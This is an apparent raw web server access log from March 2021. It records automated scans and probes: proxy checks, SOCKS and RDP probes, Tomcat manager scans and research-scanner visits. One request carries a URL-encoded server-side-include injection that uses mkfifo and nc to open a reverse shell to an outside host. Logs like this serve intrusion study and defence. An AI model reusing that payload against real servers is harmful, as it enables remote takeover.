5.178.86.76 - - [28/Mar/2021:20:47:56 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUIXONMEYXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
5.178.86.78 - - [28/Mar/2021:20:48:01 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [28/Mar/2021:20:48:05 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [28/Mar/2021:20:48:11 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.78 - - [28/Mar/2021:20:51:58 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUPXKRKEYXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.76 - - [28/Mar/2021:20:52:03 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [28/Mar/2021:20:52:08 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [28/Mar/2021:20:52:12 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:20:54:03 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.127.244 - - [28/Mar/2021:21:13:12 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
45.93.201.46 - - [28/Mar/2021:21:18:37 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:00 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:01 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:01 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:02 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:03 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:03 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:04 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:04 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:05 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:05 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:06 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:07 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:07 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:08 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:09 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:10 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:11 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:12 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
85.206.160.91 - - [28/Mar/2021:21:29:13 +0000] "POST / HTTP/1.1" 404 2602 "-" "-"
45.93.201.46 - - [28/Mar/2021:21:58:35 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
61.219.11.153 - - [28/Mar/2021:22:25:40 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [28/Mar/2021:22:43:36 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [28/Mar/2021:23:48:34 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUIXPRPBKXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15"
5.178.86.74 - - [28/Mar/2021:23:48:38 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [28/Mar/2021:23:48:43 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [28/Mar/2021:23:48:48 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.74 - - [28/Mar/2021:23:53:02 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUPRTJOBKXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.74 - - [28/Mar/2021:23:53:07 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [28/Mar/2021:23:53:12 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [28/Mar/2021:23:53:17 +0000] "\x05\x01\x00" 400 157 "-" "-"
172.105.77.209 - - [29/Mar/2021:00:13:56 +0000] "9\xCD\xC3V\x8C&\x12Dz/\xB7\xC0t\x96C\xE2" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:00:22:43 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [29/Mar/2021:01:20:20 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
111.7.96.139 - - [29/Mar/2021:01:27:53 +0000] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00" 400 157 "-" "-"
111.7.96.139 - - [29/Mar/2021:01:28:50 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Chrome/54.0 (Windows NT 10.0)"
111.7.96.139 - - [29/Mar/2021:01:28:50 +0000] "GET / HTTP/1.1" 404 1034 "-" "Chrome/54.0 (Windows NT 10.0)"
111.7.96.139 - - [29/Mar/2021:01:28:50 +0000] "GET /favicon.ico HTTP/1.1" 404 1052 "-" "Chrome/54.0 (Windows NT 10.0)"
111.7.96.139 - - [29/Mar/2021:01:28:50 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Chrome/54.0 (Windows NT 10.0)"
134.209.72.193 - - [29/Mar/2021:01:39:37 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 zgrab/0.x"
193.46.254.25 - - [29/Mar/2021:01:50:02 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6"
209.141.62.143 - - [29/Mar/2021:01:51:26 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:02:46:12 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPENOINNBUXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
5.178.86.76 - - [29/Mar/2021:02:46:16 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:02:46:21 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:02:46:27 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:02:46:56 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBNNORVUUXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.78 - - [29/Mar/2021:02:47:01 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:02:47:06 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:02:47:11 +0000] "\x05\x01\x00" 400 157 "-" "-"
162.142.125.40 - - [29/Mar/2021:03:02:51 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.40 - - [29/Mar/2021:03:02:51 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
205.185.122.102 - - [29/Mar/2021:03:38:07 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.17.97.18 - - [29/Mar/2021:03:54:11 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.62.143 - - [29/Mar/2021:03:54:19 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
64.227.97.195 - - [29/Mar/2021:04:28:58 +0000] "\x00\x0E8\xB0\xDDt\xB5\xC5\x1B\xBD\xA6\x00\x00\x00\x00\x00" 400 157 "-" "-"
209.141.56.172 - - [29/Mar/2021:05:12:15 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:05:14:30 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:05:50:04 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDIXPIVNNXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
5.178.86.78 - - [29/Mar/2021:05:50:08 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:05:50:14 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:05:50:19 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:05:54:07 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPRORYETNNXYRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.78 - - [29/Mar/2021:05:54:12 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:05:54:17 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:05:54:22 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:05:56:35 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:06:38:03 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:07:33:27 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
128.14.134.170 - - [29/Mar/2021:08:02:56 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
64.62.197.92 - - [29/Mar/2021:08:27:52 +0000] "GET / HTTP/1.1" 404 2596 "-" "-"
5.178.86.74 - - [29/Mar/2021:08:33:04 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOPOMJKUVIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.78 - - [29/Mar/2021:08:33:09 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:08:33:14 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:08:33:19 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:08:41:11 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUIIVNTNVIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
5.178.86.78 - - [29/Mar/2021:08:41:15 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:08:41:20 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:08:41:26 +0000] "\x05\x01\x00" 400 157 "-" "-"
167.248.133.53 - - [29/Mar/2021:08:53:38 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
167.248.133.53 - - [29/Mar/2021:08:53:38 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.56.172 - - [29/Mar/2021:09:04:21 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:09:30:14 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
89.40.73.231 - - [29/Mar/2021:10:33:24 +0000] "\x16\x03\x03\x00\x99\x01\x00\x00\x95\x03\x03`a\xADF\xED\xF6\xB4:\xF2$\x1C\xF6\x95\xE5-\xB1\xE1\x11q\x0E\x19\x99\xE7\xD3\x7Ff\x06W\xAFH\xE1\x91\x00\x004\xC0(\xC0'\xC0\x14\xC0\x13\x00\x9F\x00\x9E\x00\x9D\x00\x9C\xC0,\xC0+\xC0$\xC0#\xC0" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:11:06:03 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:11:20:25 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPEKRMOUUIIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.76 - - [29/Mar/2021:11:20:29 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:11:20:35 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:11:20:40 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:11:22:39 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIOEUBNUIIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.2.80 Yowser/2.5 Safari/537.36"
5.178.86.76 - - [29/Mar/2021:11:22:43 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:11:22:49 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:11:22:54 +0000] "\x05\x01\x00" 400 157 "-" "-"
152.67.42.78 - - [29/Mar/2021:11:33:45 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.122.102 - - [29/Mar/2021:12:07:38 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.143 - - [29/Mar/2021:12:27:56 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [29/Mar/2021:12:57:23 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
71.6.232.4 - - [29/Mar/2021:13:36:12 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
209.141.62.143 - - [29/Mar/2021:13:52:33 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
162.142.125.40 - - [29/Mar/2021:14:06:52 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.40 - - [29/Mar/2021:14:06:53 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.172.166.123 - - [29/Mar/2021:14:22:57 +0000] "GET / HTTP/1.0" 404 2599 "-" "-"
5.178.86.78 - - [29/Mar/2021:14:33:30 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDKRNIMJTIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
5.178.86.76 - - [29/Mar/2021:14:33:35 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:14:33:40 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:14:33:45 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:14:33:52 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIPRIDMJTIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.76 - - [29/Mar/2021:14:33:56 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:14:34:01 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [29/Mar/2021:14:34:07 +0000] "\x05\x01\x00" 400 157 "-" "-"
45.148.10.45 - - [29/Mar/2021:14:45:11 +0000] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2045.148.10.45%209772%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 404 2830 "-" "-"
152.67.42.78 - - [29/Mar/2021:15:01:28 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
2.57.122.23 - - [29/Mar/2021:15:26:16 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
2.57.122.23 - - [29/Mar/2021:15:26:16 +0000] "GET /favicon.ico HTTP/1.1" 404 1052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
209.141.62.143 - - [29/Mar/2021:15:53:54 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:16:36:13 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [29/Mar/2021:16:46:03 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:17:15:56 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:17:32:08 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOPDKOIXPIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.76 - - [29/Mar/2021:17:32:13 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:17:32:18 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:17:32:23 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:17:32:31 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPRPDIBIXPIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.76 - - [29/Mar/2021:17:32:36 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [29/Mar/2021:17:32:41 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [29/Mar/2021:17:32:46 +0000] "\x05\x01\x00" 400 157 "-" "-"
222.186.136.150 - - [29/Mar/2021:17:44:07 +0000] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 404 1047 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11"
222.186.136.150 - - [29/Mar/2021:17:44:07 +0000] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 404 1047 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0"
222.186.136.150 - - [29/Mar/2021:17:44:07 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x16\xB9|o'\xE4q\xF0,E\x9E\xA2\xFC\x9F\x81\x0E\xAD\x1CMA\x04is\xEAx\xA4\xAE\x04B\xDE\xA68 \x8F\xF2/\x5C\x85p\x5C8\x1B\x11+?=rE\x5C\xED\xC9\x8D\xA3d\x96nH\x88\xD8\xEC\x05\x0E\x8B\xBCU\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
222.186.136.150 - - [29/Mar/2021:17:44:07 +0000] "\x05\x01\x00" 400 157 "-" "-"
92.118.160.41 - - [29/Mar/2021:18:07:39 +0000] "GET / HTTP/1.0" 404 2599 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
209.141.62.143 - - [29/Mar/2021:18:11:45 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:20:01:48 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
85.119.151.254 - - [29/Mar/2021:20:47:53 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPROOTNUIOIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.119.151.250 - - [29/Mar/2021:20:47:58 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [29/Mar/2021:20:48:03 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.251 - - [29/Mar/2021:20:48:08 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.254 - - [29/Mar/2021:20:49:01 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDKRVENIOIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
85.119.151.253 - - [29/Mar/2021:20:49:06 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.254 - - [29/Mar/2021:20:49:11 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.251 - - [29/Mar/2021:20:49:16 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.56.172 - - [29/Mar/2021:21:09:45 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
23.95.222.129 - - [29/Mar/2021:21:12:06 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x039\xC1$\xD4\xF3Wl\xA4\x13\x7FR\xF2s\x15V\xB7\xBD\x87\x95\x8E\xE1\xCF\xF2#\x9C\x8B\x5C\xCB\xEF\xBA\xE9?\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:21:40:07 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [29/Mar/2021:23:07:53 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
193.118.53.194 - - [29/Mar/2021:23:40:44 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
85.119.151.251 - - [29/Mar/2021:23:46:10 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOPOVNORYIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
85.119.151.254 - - [29/Mar/2021:23:46:15 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.250 - - [29/Mar/2021:23:46:21 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.250 - - [29/Mar/2021:23:46:26 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.254 - - [29/Mar/2021:23:47:39 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPJKDNBYRYIKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
85.119.151.250 - - [29/Mar/2021:23:47:44 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.251 - - [29/Mar/2021:23:47:49 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.253 - - [29/Mar/2021:23:47:54 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.61.16 - - [29/Mar/2021:23:54:19 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.62.143 - - [30/Mar/2021:00:21:24 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
104.140.188.42 - - [30/Mar/2021:00:41:01 +0000] "GET / HTTP/1.1" 404 2601 "-" "https://gdnplus.com:Gather Analyze Provide."
209.141.56.172 - - [30/Mar/2021:00:52:22 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
45.83.65.118 - - [30/Mar/2021:01:59:06 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
209.141.62.143 - - [30/Mar/2021:02:18:26 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
